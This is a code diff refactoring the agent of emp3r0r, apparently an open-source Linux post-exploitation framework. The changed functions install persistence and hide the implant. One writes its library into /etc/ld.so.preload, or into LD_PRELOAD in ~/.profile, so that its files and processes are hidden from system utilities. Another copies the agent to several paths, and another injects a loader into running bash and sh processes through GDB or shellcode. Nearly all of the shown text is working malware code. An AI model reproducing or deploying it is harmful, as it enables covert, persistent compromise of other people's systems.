@@ -1,5 +1,7 @@
 package agent
 
+// build +linux
+
 import (
 	"errors"
 	"fmt"
@@ -10,6 +12,7 @@ import (
 	"os/user"
 	"strings"
 
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -17,6 +20,7 @@ import (
 
 var (
 	// PersistMethods CC calls one of these methods to get persistence, or all of them at once
+	// look at emp3r0r_data.PersistMethods too
 	PersistMethods = map[string]func() error{
 		"ld_preload": ldPreload,
 		"profiles":   profiles,
@@ -59,7 +63,7 @@ var (
 // SelfCopy copy emp3r0r to multiple locations
 func SelfCopy() {
 	for _, path := range EmpLocations {
-		err := util.Copy(os.Args[0], path)
+		err := CopySelfTo(path)
 		if err != nil {
 			log.Print(err)
 			continue
@@ -169,11 +173,11 @@ func profiles() (err error) {
 // add libemp3r0r.so to LD_PRELOAD
 // our files and processes will be hidden from common system utilities
 func ldPreload() error {
-	if !util.IsFileExist(Libemp3r0rFile) {
-		return fmt.Errorf("%s does not exist! Try module vaccine?", Libemp3r0rFile)
+	if !util.IsFileExist(emp3r0r_data.Libemp3r0rFile) {
+		return fmt.Errorf("%s does not exist! Try module vaccine?", emp3r0r_data.Libemp3r0rFile)
 	}
 	if os.Geteuid() == 0 {
-		return ioutil.WriteFile("/etc/ld.so.preload", []byte(Libemp3r0rFile), 0600)
+		return ioutil.WriteFile("/etc/ld.so.preload", []byte(emp3r0r_data.Libemp3r0rFile), 0600)
 	}
 
 	// if no root, we will just add libemp3r0r.so to bash profile
@@ -182,7 +186,7 @@ func ldPreload() error {
 		log.Print(err)
 		return err
 	}
-	return util.AppendToFile(u.HomeDir+"/.profile", "\nexport LD_PRELOAD="+Libemp3r0rFile)
+	return util.AppendToFile(u.HomeDir+"/.profile", "\nexport LD_PRELOAD="+emp3r0r_data.Libemp3r0rFile)
 }
 
 // AddCronJob add a cron job without terminal
@@ -193,16 +197,8 @@ func AddCronJob(job string) error {
 	return cmd.Start()
 }
 
-// Inject shellcode into a running process, the shellcode will make sure emp3r0r is alive
-// TODO choose a process to inject into
+// Inject loader.so into running processes, loader.so launches emp3r0r
 func injector() (err error) {
-	// this shellcode forks a process and executes emp3r0r agent
-	// https://github.com/jm33-m0/emp3r0r/blob/master/shellcode/guardian.asm
-	err = util.Copy(os.Args[0], GuardianAgentPath)
-	if err != nil {
-		return
-	}
-
 	// find some processes to inject
 	procs := util.PidOf("bash")
 	procs = append(procs, util.PidOf("sh")...)
@@ -217,14 +213,15 @@ func injector() (err error) {
 				return
 			}
 			log.Printf("Injecting to %s (%d)...", util.ProcCmdline(pid), pid)
-			e := Injector(&GuardianShellcode, pid)
+
+			e := GDBInjectSO(pid)
 			if e != nil {
 				err = fmt.Errorf("%v, %v", err, e)
 			}
 		}(pid)
 	}
 	if err != nil {
-		return fmt.Errorf("All attempts failed (%v), trying with new child process: %v", err, Injector(&GuardianShellcode, 0))
+		return fmt.Errorf("All attempts failed (%v), trying with new child process: %v", err, ShellcodeInjector(&emp3r0r_data.GuardianShellcode, 0))
 	}
 
 	return
